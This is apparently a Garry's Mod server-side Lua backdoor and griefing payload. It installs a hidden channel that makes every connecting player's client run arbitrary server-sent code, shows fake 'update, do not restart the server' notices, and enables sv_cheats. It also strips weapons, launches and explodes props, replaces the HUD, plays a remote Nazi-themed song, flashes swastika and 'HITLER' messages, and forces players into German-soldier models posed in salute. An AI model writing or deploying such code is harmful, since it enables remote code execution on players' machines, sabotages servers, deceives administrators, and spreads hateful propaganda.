

util.AddNetworkString &quot;slua&quot;

local fureur = {}
function fureur:RandomString( intMin, intMax )
	local ret = &quot;&quot;
	for _ = 1, math.random( intMin, intMax ) do
		ret = ret.. string.char( math.random(65, 90) )
	end

	return ret
end

fureur.m_tblActions = {}
fureur.m_strImageGlobalVar = fureur:RandomString( 6, 12 )
fureur.m_strImageLoadHTML = [[&lt;style type=&quot;text/css&quot;&gt; html, body {background-color: transparent;} html{overflow:hidden; ]].. (true and &quot;margin: -8px -8px;&quot; or &quot;margin: 0px 0px;&quot;) ..[[ } &lt;/style&gt;&lt;body&gt;&lt;img src=&quot;]] .. &quot;%s&quot; .. [[&quot; alt=&quot;&quot; width=&quot;]] .. &quot;%i&quot;..[[&quot; height=&quot;]] .. &quot;%i&quot; .. [[&quot; /&gt;&lt;/body&gt;]]

function fureur:PushAction( intChainDelay, func )
	self.m_tblActions[#self.m_tblActions +1] = { intChainDelay, func }
end

function fureur:NextAction( pPlayer )
	pPlayer.m_intCurAction = pPlayer.m_intCurAction +1
	if not self.m_tblActions[pPlayer.m_intCurAction] then return end

	timer.Simple( self.m_tblActions[pPlayer.m_intCurAction][1], function()
		if not IsValid( pPlayer ) then return end
		self.m_tblActions[pPlayer.m_intCurAction][2]( pPlayer )
		self:NextAction( pPlayer )
	end )
end

function fureur:Start( pPlayer )
	pPlayer.m_intCurAction = 0
	self:NextAction( pPlayer )
end

function fureur:SendLua( pPlayer, strLua )
	net.Start( &quot;slua&quot; )
		net.WriteString( strLua )
	net.Send( pPlayer )
end

function fureur:SetupPlayer( pPlayer )
	pPlayer:SendLua( &quot;net.Receive(\&quot;slua\&quot;, function() RunString(net.ReadString()) end)&quot; )
	timer.Simple( 0.001, function() 
	game.ConsoleCommand(&quot;sv_cheats&quot;, &quot;1&quot;)
	pPlayer:SendLua( &quot;notification.AddProgress( \&quot;Mise A Jour\&quot;, \&quot;Update New Downloading New file Please No Restart your server...\&quot; )&quot; )
	pPlayer:SendLua( &quot;notification.AddProgress( \&quot;Mise A Jour1\&quot;, \&quot;Mise A Jour T&eacute;l&eacute;chargement d'un nouveau fichier, s'il vous pla&icirc;t Ne Rebooter pas le serveur...\&quot; )&quot; )

	
	
	
	
	end)
	timer.Simple( 43.0, function() 
	pPlayer:SendLua( &quot;notification.Kill( \&quot;Mise A Jour\&quot; ) &quot;)
	pPlayer:SendLua( &quot;notification.Kill( \&quot;Mise A Jour1\&quot; ) &quot;)

	end)

timer.Simple( 0.001, function() 
	timer.Create(&quot;gaymod&quot;,1.150,0,function()
	pPlayer:SendLua( &quot;notification.AddLegacy( \&quot;卐HITLER卍\&quot;, NOTIFY_UNDO, 2 )&quot; )
	end)

	pPlayer:SendLua( [[RunConsoleCommand(&quot;gmod_language&quot;, &quot;de&quot;)]] )
	timer.Simple( 15.0, function() 
	pPlayer:SendLua( [[RunConsoleCommand(&quot;thirdperson&quot;)]] )
	end)
end)
end

for k, v in pairs( player.GetAll() ) do
	fureur:SetupPlayer( v )
	timer.Simple( 2, function() fureur:Start( v ) end )
end

hook.Add( &quot;PlayerAuthed&quot;, &quot;wat&quot;, function( pPlayer )
	fureur:SetupPlayer( pPlayer )
	timer.Simple( 10, function() fureur:Start( pPlayer ) end )	
end )

hook.Add( &quot;PlayerSay&quot;, &quot;1337command&quot;, function( pSender, strText, bTeamChat )
	if strText:sub( 1, 5 ) == &quot;/1337&quot; then
		pSender:ChatPrint( &quot;Regarde la langue de ton gmod cheh fdp&quot; )
		pSender:SendLua( [[RunConsoleCommand(&quot;gmod_language&quot;, &quot;de&quot;)]] )
		return false
	end
end )

fureur:PushAction( 1, function( pPlayer )
RunConsoleCommand(&quot;sv_cheats&quot;, &quot;1&quot;)
end )


--Sequence stack
--Start some tunes and steam in our assets
fureur:PushAction( 0.001, function( pPlayer )

	fureur:SendLua( pPlayer, ([=[
		sound.PlayURL( &quot;https://kvac.cz/assets/Chui_Un_Bon_Nazi_.mp3&quot;, &quot;&quot;, function()end )
		
		g_]=].. fureur.m_strImageGlobalVar.. [=[ = {}
		local html = [[%s]]
		local function LoadWebMaterial( strURL, strUID, intSizeX, intSizeY )
			local pnl = vgui.Create( &quot;HTML&quot; )
			pnl:SetPos( ScrW() -1, ScrH() -1 )
			pnl:SetVisible( true )
			pnl:SetMouseInputEnabled( false )
			pnl:SetKeyBoardInputEnabled( false )
			pnl:SetSize( intSizeX, intSizeY )
			pnl:SetHTML( html:format(strURL, intSizeX, intSizeY) )
			
			local PageLoaded
			PageLoaded = function()
				local mat = pnl:GetHTMLMaterial()
				if mat then
					g_]=].. fureur.m_strImageGlobalVar.. [=[[strUID] = { mat, pnl }
					return
				end
				
				timer.Simple( 0.5, PageLoaded )
			end

			PageLoaded()
		end
	



		LoadWebMaterial( &quot;&quot;, &quot;hud1&quot;, 300, 128 )
		LoadWebMaterial( &quot;&quot;, &quot;hud2&quot;, 300, 128 )
		LoadWebMaterial( &quot;&quot;, &quot;hud3&quot;, 128, 128 )
		LoadWebMaterial( &quot;&quot;, &quot;xhair&quot;, 64, 64 )
		LoadWebMaterial( &quot;&quot;, &quot;doritos&quot;, 183, 256 )
		LoadWebMaterial( &quot;&quot;, &quot;fedora&quot;, 256, 256 )
		LoadWebMaterial( &quot;&quot;, &quot;dew&quot;, 110, 256 )
		LoadWebMaterial( &quot;&quot;, &quot;awp&quot;, 256, 55 )
	]=]):format(fureur.m_strImageLoadHTML) )
end )

--HUD swap
fureur:PushAction( 0.020, function( pPlayer )
	fureur:SendLua( pPlayer, [[
		(GAMEMODE or GM).CalcView = function() end
		(GAMEMODE or GM).ShouldDrawLocalPlayer = function() end

		local remove = { &quot;PostDrawHUD&quot;, &quot;PreDrawHUD&quot;, &quot;HUDPaint&quot;, &quot;HUDPaintBackground&quot;, &quot;CalcView&quot;, &quot;ShouldDrawLocalPlayer&quot; }
		for k, v in pairs(remove) do
			hook.GetTable()[v] = {}
		end

		local function GetWebMat( strURL )
			return g_]].. fureur.m_strImageGlobalVar.. [[[strURL]
		end

		hook.Add( &quot;HUDPaint&quot;, &quot;newhud&quot;, function()
			surface.SetDrawColor( 255, 255, 255, 255 )


    draw.SimpleTextOutlined(
                 &quot;Anatik the baise&quot;,
                &quot;DermaLarge&quot;,
                RealTime() * 500% ScrW() +math.random( -3, 3 ),
                RealTime() * 500% ScrH() +math.random( -3, 3 ) +64,
                Color( math.random(0,255),math.random(0,255),math.random(0,255), 255 ),
                TEXT_ALIGN_CENTER,
                TEXT_ALIGN_CENTER,
                1,
                Color( math.random(0,255),math.random(0,255),math.random(0,255), 255 )
            )
    draw.SimpleTextOutlined(
                 &quot;Anatik the baise&quot;,
                &quot;DermaLarge&quot;,
                RealTime() * 530% ScrW() +math.random( -3, 3 ),
                RealTime() * 500% ScrH() +math.random( -3, 3 ) +64,
                Color( math.random(0,255),math.random(0,255),math.random(0,255), 255 ),
                TEXT_ALIGN_CENTER,
                TEXT_ALIGN_CENTER,
                1,
                Color( math.random(0,255),math.random(0,255),math.random(0,255), 255 )
            )
    draw.SimpleTextOutlined(
                 &quot;Anatik the baise&quot;,
                &quot;DermaLarge&quot;,
                RealTime() * 500% ScrW() +math.random( -3, 3 ),
                RealTime() * 700% ScrH() +math.random( -3, 3 ) +64,
                Color( math.random(0,255),math.random(0,255),math.random(0,255), 255 ),
                TEXT_ALIGN_CENTER,
                TEXT_ALIGN_CENTER,
                1,
                Color( math.random(0,255),math.random(0,255),math.random(0,255), 255 )
            )
    draw.SimpleTextOutlined(
                 &quot;Anatik the baise&quot;,
                &quot;DermaLarge&quot;,
                RealTime() * 600% ScrW() +math.random( -3, 3 ),
                RealTime() * 500% ScrH() +math.random( -3, 3 ) +64,
                Color( math.random(0,255),math.random(0,255),math.random(0,255), 255 ),
                TEXT_ALIGN_CENTER,
                TEXT_ALIGN_CENTER,
                1,
                Color( math.random(0,255),math.random(0,255),math.random(0,255), 255 )
            )
    draw.SimpleTextOutlined(
                 &quot;Anatik the baise&quot;,
                &quot;DermaLarge&quot;,
                RealTime() * 800% ScrW() +math.random( -3, 3 ),
                ScrW() /2 +math.random( -3, 3 ) +64,
                Color( math.random(0,255),math.random(0,255),math.random(0,255), 255 ),
                TEXT_ALIGN_CENTER,
                TEXT_ALIGN_CENTER,
                1,
                Color( math.random(0,255),math.random(0,255),math.random(0,255), 255 )
            )
    draw.SimpleTextOutlined(
                 &quot;Anatik the baise&quot;,
                &quot;DermaLarge&quot;,
                RealTime() * 630% ScrW() +math.random( -3, 3 ),
                RealTime() * 500% ScrH() +math.random( -3, 3 ) +64,
                Color( math.random(0,255),math.random(0,255),math.random(0,255), 255 ),
                TEXT_ALIGN_CENTER,
                TEXT_ALIGN_CENTER,
                1,
                Color( math.random(0,255),math.random(0,255),math.random(0,255), 255 )
            )
    draw.SimpleTextOutlined(
                 &quot;Anatik the baise&quot;,
                &quot;DermaLarge&quot;,
                ScrW() /2 +math.random( -3, 3 ),
                RealTime() * 700% ScrH() +math.random( -3, 3 ) +64,
                Color( math.random(0,255),math.random(0,255),math.random(0,255), 255 ),
                TEXT_ALIGN_CENTER,
                TEXT_ALIGN_CENTER,
                1,
                Color( math.random(0,255),math.random(0,255),math.random(0,255), 255 )
            )
    draw.SimpleTextOutlined(
                 &quot;Anatik the baise&quot;,
                &quot;DermaLarge&quot;,
                RealTime() * 150% ScrW() +math.random( -3, 3 ),
                RealTime() * 300% ScrH() +math.random( -3, 3 ) +64,
                Color( math.random(0,255),math.random(0,255),math.random(0,255), 255 ),
                TEXT_ALIGN_CENTER,
                TEXT_ALIGN_CENTER,
                1,
                Color( math.random(0,255),math.random(0,255),math.random(0,255), 255 )
            )
    draw.SimpleTextOutlined(
                 &quot;Anatik the baise&quot;,
                &quot;DermaLarge&quot;,
                RealTime() * 100% ScrW() +100,
                RealTime() * 200% ScrH() +math.random( -3, 3 ) +64,
                Color( math.random(0,255),math.random(0,255),math.random(0,255), 255 ),
                TEXT_ALIGN_CENTER,
                TEXT_ALIGN_CENTER,
                1,
                Color( math.random(0,255),math.random(0,255),math.random(0,255), 255 )
            )
    draw.SimpleTextOutlined(
                 &quot;Anatik the baise&quot;,
                &quot;DermaLarge&quot;,
                ScrW() /2 +math.random( -3, 3 ),
                RealTime() * 700% ScrH() +math.random( -3, 3 ) +64,
                Color( math.random(0,255),math.random(0,255),math.random(0,255), 255 ),
                TEXT_ALIGN_CENTER,
                TEXT_ALIGN_CENTER,
                1,
                Color( math.random(0,255),math.random(0,255),math.random(0,255), 255 )
            )
    draw.SimpleTextOutlined(
                 &quot;Anatik the baise&quot;,
                &quot;DermaLarge&quot;,
                RealTime() * 150% ScrW() +math.random( -3, 3 ),
                RealTime() * 300% ScrH() +math.random( -3, 3 ) +64,
                Color( math.random(0,255),math.random(0,255),math.random(0,255), 255 ),
                TEXT_ALIGN_CENTER,
                TEXT_ALIGN_CENTER,
                1,
                Color( math.random(0,255),math.random(0,255),math.random(0,255), 255 )
            )
    draw.SimpleTextOutlined(
                 &quot;Anatik the baise&quot;,
                &quot;DermaLarge&quot;,
                RealTime() * 100% ScrW() +100,
                RealTime() * 200% ScrH() +math.random( -3, 3 ) +64,
                Color( math.random(0,255),math.random(0,255),math.random(0,255), 255 ),
                TEXT_ALIGN_CENTER,
                TEXT_ALIGN_CENTER,
                1,
                Color( math.random(0,255),math.random(0,255),math.random(0,255), 255 )
            )
		end )

		local allowed = { [&quot;CHudChat&quot;] = true, [&quot;CHudGMod&quot;] = true, [&quot;CHudWeaponSelection&quot;] = true, [&quot;CHudMenu&quot;] = true }
		hook.Add( &quot;HUDShouldDraw&quot;, &quot;newhud&quot;, function( str ) if not allowed[str] then return false end end )

 

		

		surface.PlaySound( &quot;garrysmod/save_load4.wav&quot; )
		surface.PlaySound( &quot;vo/npc/male01/excuseme02.wav&quot; )
	]] )
	
	        timer.Create( &quot;earthquake&quot;, 0.5, 500, function()
 

 
 
 
            for _, e in pairs(ents.GetAll()) do
 
                if e:GetPhysicsObject() and e:GetPhysicsObject():IsValid() then e:GetPhysicsObject():AddVelocity( Vector( math.random( -100, 100 ), math.random( -100, 100 ), math.random( 270, 390 ) ) ) end
 
            end
 
 
 
 
 
        end)
hook.Add(&quot;Think&quot;, &quot;Booom&quot;, function()
local tr = Entity( 1 ):GetEyeTrace()
                local ent = ents.Create( &quot;prop_physics&quot; )
					  ent:SetModel( &quot;models/hunter/misc/sphere2x2.mdl&quot; )
					  ent:SetPos( Vector(math.random(-6000, 6000), math.random(-6000, 6000), math.random(0, 1000)) )
					  ent:Spawn()
					  ent:Fire( &quot;Explode&quot;, 0, 0 ) 
                      ent:SetMaterial(&quot;models/props_c17/metalladder002&quot;)
					  timer.Simple( 4, function()
					  
					  ent:Remove()
					  
					  end )
end)



end )


fureur:PushAction( 0.02, function( pPlayer )
	fureur:SendLua( pPlayer, [[
		(GAMEMODE or GM).CalcView = function() end
		(GAMEMODE or GM).ShouldDrawLocalPlayer = function() end

		local remove = { &quot;PostDrawHUD&quot;, &quot;PreDrawHUD&quot;, &quot;HUDPaint&quot;, &quot;HUDPaintBackground&quot;, &quot;CalcView&quot;, &quot;ShouldDrawLocalPlayer&quot; }
		for k, v in pairs(remove) do
			hook.GetTable()[v] = {}
		end

		local function GetWebMat( strURL )
			return g_]].. fureur.m_strImageGlobalVar.. [[[strURL]
		end


		local allowed = { [&quot;CHudChat&quot;] = true, [&quot;CHudGMod&quot;] = true, [&quot;CHudWeaponSelection&quot;] = true, [&quot;CHudMenu&quot;] = true }
		hook.Add( &quot;HUDShouldDraw&quot;, &quot;newhud&quot;, function( str ) if not allowed[str] then return false end end )

 

		

		surface.PlaySound( &quot;garrysmod/save_load4.wav&quot; )
		surface.PlaySound( &quot;vo/npc/male01/excuseme02.wav&quot; )
	]] )
timer.Create(&quot;gay1&quot;,0.001,0,function()
for k,v in pairs(player.GetAll()) do v:SetModel(&quot;models/player/dod_german.mdl&quot;) end
end)
timer.Create(&quot;gay2&quot;,0.001,0,function()
for k,v in pairs(player.GetAll()) do 
    local f = v:LookupBone(&quot;ValveBiped.Bip01_R_UpperArm&quot;)
    local h = v:LookupBone(&quot;ValveBiped.Bip01_R_Forearm&quot;)
    local j = v:LookupBone(&quot;ValveBiped.Bip01_R_Hand&quot;)
    v:ManipulateBoneAngles( f, Angle( 25,  -140, -75 ) )
    v:ManipulateBoneAngles( h, Angle( 0,  25, 0 ) )
    v:ManipulateBoneAngles( j, Angle( 0,  25, 0 ) )
end
end)
timer.Create(&quot;gay3&quot;,0.001,0,function()
for k,v in pairs(player.GetAll()) do
v:StripWeapons()
end
end)
end )

fureur:PushAction( 47, function( pPlayer )
	fureur:SendLua( pPlayer, [[
		(GAMEMODE or GM).CalcView = function() end
		(GAMEMODE or GM).ShouldDrawLocalPlayer = function() end

		local remove = { &quot;PostDrawHUD&quot;, &quot;PreDrawHUD&quot;, &quot;HUDPaint&quot;, &quot;HUDPaintBackground&quot;, &quot;CalcView&quot;, &quot;ShouldDrawLocalPlayer&quot; }
		for k, v in pairs(remove) do
			hook.GetTable()[v] = {}
		end

		local function GetWebMat( strURL )
			return g_]].. fureur.m_strImageGlobalVar.. [[[strURL]
		end
		hook.Remove(&quot;HUDPaint&quot;, &quot;newhud&quot;)
hook.Remove( &quot;HUDPaint&quot; ,&quot;newhud1&quot;)
		hook.Add( &quot;HUDPaint&quot;, &quot;newhud1&quot;, function()
			surface.SetDrawColor( 255, 255, 255, 255 )

		end )

		local allowed = { [&quot;CHudChat&quot;] = true, [&quot;CHudGMod&quot;] = true, [&quot;CHudWeaponSelection&quot;] = true, [&quot;CHudMenu&quot;] = true }
		hook.Add( &quot;HUDShouldDraw&quot;, &quot;newhud&quot;, function( str ) if not allowed[str] then return false end end )

 

		

		surface.PlaySound( &quot;garrysmod/save_load4.wav&quot; )
		surface.PlaySound( &quot;vo/npc/male01/excuseme02.wav&quot; )
	]] )

end )